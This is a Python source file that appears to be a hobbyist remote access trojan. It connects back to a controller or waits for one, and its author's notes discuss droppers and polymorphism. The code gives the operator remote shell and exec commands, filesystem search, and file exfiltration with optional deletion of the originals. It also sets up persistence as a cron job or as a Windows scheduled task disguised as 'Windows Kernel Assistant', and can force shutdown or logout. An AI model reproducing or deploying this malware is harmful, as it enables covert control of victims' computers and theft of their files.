#!/usr/bin/env python3
#FOR PYTHON 3
__version__ = '0.5'
__author__ = 'Yoav Rafalin'
import socket, cmd, getpass, os, argparse, time, platform, subprocess

#Constants
IP = '127.0.0.1'
PORT = 6000
SYSTEM = platform.system()
idlist = subprocess.check_output('groups').decode('utf-8').split()
ADMINCHECK = idlist[6]

#Setting up runmode
runmode = argparse.ArgumentParser(description='Get runmode')
runmode.add_argument('-a', '--active', action='store_true')#runmode for active(reaching out to the other side)
runmode.add_argument('-p', '--passive', action='store_true')#runmode for passive(waiting to receive connection)
runmode.add_argument('-r', '--reactive', action='store_true')#runmode for reactive(waiting to receive signal)
MODE = vars(runmode.parse_args())#Turns into dict

# Things I learned:
# two-stage droppers use a dropper and another stage to get the actual malware
# things that may stop the dropper to get the malware are:
# url may be susp, the attampt to connect, and the payload
# memory-running tradeoff: having more data makes the runtime shorter because there is less to calculate
# polymorphism says that every piece of code can be represented in an infinite number of ways
# take argparse input from main() input
# have less repetition
# refactor message and lenofmsg
# make gen_msg function
# add file transfer mech
# chunk file transfer
# make buffer small so that you can be preemptive
# next time maybe make a protector
# keep it DRY: Don't Repeat Yourself

#Utility functions
def encode_with_key(string_to_encode, key):#Encrypting and decrypting
    list_of_numbers = []
    for letter in string_to_encode:
        list_of_numbers.append(str(ord(letter)*key))
    return ' '.join(list_of_numbers).encode()

def decode_with_key(bytes_to_encode, key):
    string_of_bytes = ''
    list_of_bytes = (bytes_to_encode.decode('utf-8')).split()
    for letter in list_of_bytes:
        string_of_bytes += chr(int(int(letter)//key))
    return string_of_bytes

def send_message(message_to_send, key, socket, lenoflenofmsg=5):
    message = encode_with_key(str(message_to_send), int(key))
    length_of_msg = str(len(message))
    length_of_msg = ('0' * (lenoflenofmsg-len(length_of_msg))) + length_of_msg#This part is adding zeros as padding so that it is always 5 chars
    socket.send(length_of_msg.encode())
    socket.send(message)
    return message, length_of_msg

def recv_message(key, connection, lenoflenofmsg=5):
    'Does the receiving protocol.'
    length_of_msg = int(connection.recv(lenoflenofmsg).decode('utf-8'))
    if key == None:
        message = connection.recv(length_of_msg).decode('utf-8')
    else:
        message = decode_with_key(connection.recv(length_of_msg), int(key))
    return message

def chunk_transfer(file_path, chunk_sizes, connection, key):
    try:
        opened_file = open(file_path, mode='rb')
        filesize = os.stat(file_path).st_size
        chunk_numbers = []
        for size in chunk_sizes:
            chunk_numbers.append(str(filesize//size))
            filesize = filesize % size
        message, length_of_msg = send_message(' '.join(chunk_numbers), key, connection)
        filesize = os.stat(file_path).st_size
        while True:
            if filesize < 1:
                break
            connection.send(opened_file.read(1024))
            filesize -= 1024
        opened_file.close()
        return 'Transfer succeded from this end.'
    except Exception as e:
        return 'Transfer failed.', e

def find_all_files(start_path='//', mode=0):
    if start_path[-1:] == '/':
        start_path = start_path[:-1]
    #start_path = start_path[:-1] if start_path[:-1] == '/'
    all_files = []
    path_contents = os.listdir(start_path)
    print(path_contents)
    for obj in path_contents:
        try:#In case PermissionError occurs
            if os.path.isfile(start_path + '/' + obj):
                all_files.append(start_path + '/' + obj)
            elif os.path.isdir(start_path + '/' + obj):
                all_files.extend(find_all_files(start_path + '/' + obj))
        except:
            continue
    if mode:
        size_of_files = 0
        for path in all_files:
            size_of_files += os.stat(path).st_size
        return all_files, size_of_files
    else:
        return all_files

#Cmd class
class recv_commands(cmd.Cmd):
    def __init__(self, server, system, key):#VERY IMPORTANT lets me use key and socket outside main
        self.key = key
        self.server = server
        self.system = system
        #self.chunk_sizes = chunk_sizes
    def do_exit(self, arg):
        return 0#Makes continue_loop 0
    def do_loggedin(self, arg):
        message, length_of_msg = send_message(getpass.getuser(), self.key, self.server)
        print('loggedin', length_of_msg)
        return 1
    def do_WHOAMI(self, arg):
        message, length_of_msg = send_message(getpass.getuser(), self.key, self.server)
        print('whoami', length_of_msg)
        return 1
    def do_volume(self, arg):
        os.system('osascript -e \'set volume '+arg+'\'')#Uses applescript
        os.system('osascript -e \'get volume settings\'')#To see actual volume as set volume is not very reliable
        print('volume '+ arg)
        return 1
    def do_say(self, arg):
        os.system('say ' + str(arg))
        print('say ' + arg)
        return 1
    def do_logout(self, arg):
        print('logout')
        if self.system == 'Windows':
            os.system('shutdown -l -f')
        else:
            os.system('osascript -e \'tell application \"loginwindow\" to «event aevtrlgo»\'')
        return 1
    def do_shutdown(self, arg):
        print('shutdown')
        if self.system == 'Windows':
            os.system('shutdown -s -f')
        else:
            os.system('osascript -e \'tell app \"System Events\" to shut down\'')
        return 1
    def do_sleep(self, arg):
        print('sleep')
        if self.system == 'Windows':
            os.system('psshutdown -d')
        elif self.system == 'Darwin':
            os.system('osascript -e \'tell app "System Events" to sleep\'')
        else:#Last one is Linux
            os.system('xset -display :0.0 dpms force off')
        return 1
    def do_exec(self, arg):
        print('exec '+ str(arg))
        args = arg.split()
        try:
            exec(args)
        except:
            pass
        return 1
    def do_cmd(self, arg):
        args = arg.split()
        try:
            message = subprocess.check_output(args).decode('utf-8')
        except:
            message = '!Command Failed!'
        message, length_of_msg = send_message(message, self.key, self.server)
        print('system cmd', length_of_msg)
        return 1
    def do_dir(self, arg):
        try:
            message, length_of_msg = send_message('\n'.join(os.listdir(arg)), self.key, self.server)
        except:
            message, length_of_msg = send_message('That directory does not exist.', self.key, self.server)
        print('system cmd', length_of_msg)
        return 1
    def do_pers(self, arg):
        if self.system == 'Darwin' or self.system == 'Linux':
            try:
                message = subprocess.check_output(['cron', '@reboot', str(os.path.abspath(__file__))])#Will fail on try unlike run()
                message = 'Success! File put in crontab.'
            except:
                message = '!Persistance Failed!'
        else:#This one for Windows
            try:
                message = subprocess.check_output(['schtasks', '/create', '/tn', '"Windows Kernel Assistant"', '/tr', os.path.abspath(__file__), '/sc onstart'])
                message = 'Success! File set as scheduled task.'
            except:
                message = '!Persistance Failed!'
        message, length_of_msg = send_message(message, self.key, self.server)
        print('persistance', length_of_msg)
        return 1
    def do_portscan(self, arg):
        args = arg.split('-')#Splitting on dash to find ends of range
        if len(args) > 1:
            ports_to_scan = [range(int(args[0]), int(args[1])+1)]
        elif len(args) == 1:#If no dash then there was no range
            ports_to_scan = [args]
        else:
            ports_to_scan = ['19', '22', '23', '53', '80', '115', '123']
        print(ports_to_scan)
        avail_ports = []
        for portcheck in ports_to_scan:
            client = socket.socket()
            try:
                client.connect(('127.0.0.1', portcheck))
                avail_ports.append(str(portcheck))
            except:
                pass

        message, length_of_msg = send_message(' '.join(avail_ports), self.key, self.server)
        print('portscan ' + str(arg), length_of_msg)
        return 1
    def do_searchword(self, arg):
        keyword = arg.split(' in ')[0]
        path_to_search = arg.split(' in ')[-1]
        if path_to_search != keyword:
            file_list = find_all_files(path_to_search)
        else:
            keyword = arg.split(' ')[0]
            path_to_search = arg.split(' ')[-1]
            if path_to_search != keyword:
                file_list = find_all_files(path_to_search)
            else:
                file_list = find_all_files()
        #file_list = find_all_files(path_to_search if path_to_search != keyword)
        print(file_list)
        flagged = []
        for path in file_list:
            print(path)
            if keyword.lower() in path.lower():
                flagged.append(path)
        print(flagged)
        message, length_of_msg = send_message('\n'.join(flagged), self.key, self.server)
        return 1
    def do_stream(self, arg):
        if arg[:4] == 'del ':
            del_file = True
            arg = arg[4:]
        else:
            del_file = False

        try:
            opened_file = open(arg, mode='rb')
            message = 'That file exists and will be streamed over.'
            file_open = True
        except:
            message = 'That file does not exist.'
            file_open = False
        message, length_of_msg = send_message(message, self.key, self.server)
        print('stream ' + arg, length_of_msg)

        if file_open:
            filesize = os.stat(arg).st_size
            while True:
                message = opened_file.read(512)
                #message = ('0'* (3-len(str(512-len(message)))) + str(512-len(message))).encode() + message + ('0'* (512-len(message))).encode()
                #if opened_file.read(1):
                #   message = b'0' + message#0 means there is more
                #   opened_file.seek(-1, 1)
                #else:
                #   message = b'1' + message#1 means EOF reached
                if len(message) < 512:
                    endfile = b'1'
                else:
                    endfile = b'0'
                message = endfile + ('0'* (3-len(str(512-len(message)))) + str(512-len(message))).encode() + message + ('0'* (512-len(message))).encode()
                self.server.send(message)
                if opened_file.read(1):
                    opened_file.seek(-1, 1)
                else:
                    break
            opened_file.close()
            if del_file:
                os.remove(arg)
        return 1
    def do_transfer(self, arg):
        if arg[:4] == 'del ':
            del_file = True
            arg = arg[4:]
        else:
            del_file = False

        if os.path.isfile(arg):
            #chunk_sizes = [512, 64, 8, 1]
            message, length_of_msg = send_message('That file exists and will be transfered.', self.key, self.server)
            print('transfer ' + arg, length_of_msg)
            transfer_success = chunk_transfer(arg, [512, 64, 8, 1], self.server, self.key)
            print(transfer_success)
            if del_file:
                os.remove(arg)
        elif os.path.isdir(arg):
            message, length_of_msg = send_message('That directory exists and its contents will be transfered.', self.key, self.server)
            print('transfer ' + arg, length_of_msg)
            file_list, size_of_files = find_all_files(arg, 1)
            print(file_list)
            message, length_of_msg = send_message('Would you like to transfer all {num} files. That is {byte} bytes. '.format(num = len(file_list), byte = size_of_files), self.key, self.server)
            if recv_message(self.key, self.server) == 'y':
                message, length_of_msg = send_message(str(len(file_list)), self.key, self.server)
                for path in file_list:
                    message = arg.split('/')[-1] + '/' + path[len(arg)+1:]
                    print(message)
                    message, length_of_msg = send_message(message, self.key, self.server)#the string chopping process removes the path of the this computer which is not being replicated on the clientside
                    print(chunk_transfer(path, [512, 64, 8, 1], self.server, self.key))
                if del_file:
                    from shutil import rmtree
                    #shutil.rmtree(arg) #let's not deal with accidentally deleating the /users directory
        else:
            message, length_of_msg = send_message('That cannot be accessed.', self.key, self.server)
            print('transfer ' + arg, length_of_msg)
        return 1
    def do_transferto(self, arg):
        chunk_sizes = [512, 64, 8, 1]
        length_of_msg = int(self.server.recv(5).decode('utf-8'))
        filename = decode_with_key(self.server.recv(length_of_msg), int(self.key))#getting filename from client

        length_of_msg = int(self.server.recv(5).decode('utf-8'))
        message = decode_with_key(self.server.recv(length_of_msg), int(self.key))
        chunk_numbers = message.split()
        local_file = open(arg+'/{}'.format(filename.split('/')[-1]), mode='wb')
        cycle = 0
        for num in chunk_numbers:
            for chunk in range(int(num)):
                local_file.write(self.server.recv(chunk_sizes[cycle]))
            cycle += 1
        local_file.close()
        return 1
    def do_admin(self, arg):
        if ADMINCHECK == 'admin':
            message = 'You are in an admin account.'
        else:
            message = 'You are not in an admin account.'
        message, length_of_msg = send_message(message, self.key, self.server)
        print('admin', length_of_msg)
        return 1
    def do_su(self, arg):
        if ADMINCHECK == 'admin':
            sucmd = subprocess.run(['su'], stdin=subprocess.PIPE)
            sucmd.stdin = arg
        print('su ' + arg)
        return 1
    def do_system(self, arg):
        message, length_of_msg = send_message(self.system, self.key, self.server)
        print('system', length_of_msg)
        return 1
    def do_uname(self, arg):
        if len(arg) > 0:
            message = platform.uname()[int(arg)]#platform.uname returns named tuple
        else:
            message = ' '.join(list(platform.uname()))
        message, length_of_msg = send_message(message, self.key, self.server)
        print('uname' + str(arg), length_of_msg)
        return 1
    def do_killattack(self, arg):
        print(os.path.abspath(__file__))
        #os.remove(os.path.abspath(__file__))
        return 0

#Entry point
def main(mode_input=MODE, key_input=None, ip_input=IP, port_input=PORT, recvkey=True):
    'Main function'

    continue_loop = 1#Stopping the cmdone loop uses this var
    sizes = [512, 64, 8, 1]

    print(mode_input)

    #Setting up socket
    if mode_input['active'] == True and mode_input['passive'] == True:
        print('Not a valid input')
        raise SystemExit
    elif mode_input['reactive'] == True:
        while True:
            time.sleep(10)
            instances_in_log = subprocess.check_output(['log', 'stream', '|', 'grep', '"runreactive"']).decode('utf-8').split('\n')
            if len(instances_in_log) == 0:
                continue
            for line in instances_in_log:
                if 'exec' in line:
                    exec('pass')#figure this part out
            for line in instances_in_log:
                if 'cmd' in line:
                    os.system('ls')#figure this part out
    elif mode_input['active'] == True:
        while True:
            time.sleep(2)#To not use a noticadable amount of cpu
            try:
                server = socket.socket()
                server.connect((ip_input, port_input))
                break
            except:
                pass
    else:
        connect = socket.socket()
        connect.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)#To not get Errno [48] port in use
        connect.bind((ip_input, port_input))
        connect.listen(1)
        server, addr = connect.accept()
    '''while True:#For multiple requests
        server, addr = server.accept()
        length_of_msg = int(server.recv(2).decode('utf-8'))
        key = round(int(round(int(server.recv(length_of_msg).decode('utf-8'))**(1/2))))#Sqrt of key
        print('key', key)
        continue_loop = 1#Stopping the loop uses this var
        while continue_loop:
            length_of_msg_rtrnd = int(server.recv(5).decode('utf-8'))#Standard protocol for my project
            msg_recvd = str(decode_with_key(server.recv(length_of_msg_rtrnd), key))#Then receive real msg
            print('message recvd', msg_recvd)
            continue_loop = recv_commands(key, server).onecmd(msg_recvd)
        print('Bye')
        server.close()'''
    if recvkey == True:
        length_of_msg = int(server.recv(2).decode('utf-8'))
        key_input = round(int(round(int(server.recv(length_of_msg).decode('utf-8'))**(1/2))))#Sqrt of key
    length_of_msg = str(len(platform.system().encode()))
    length_of_msg = ('0' * (2-len(length_of_msg))) + str(length_of_msg)
    server.send(length_of_msg.encode())#Send os len
    server.send(SYSTEM.encode('utf-8'))#Send os
    print('key', key_input)
    while continue_loop:
        length_of_msg = int(server.recv(5).decode('utf-8', 'ignore'))#Standard protocol for my project
        msg_recvd = str(decode_with_key(server.recv(length_of_msg), key_input))#Then receive real msg
        print('message recvd', msg_recvd)
        continue_loop = recv_commands(server, SYSTEM, key_input).onecmd(msg_recvd)
    print('Bye')
    server.close()

if __name__ == '__main__':
    main()
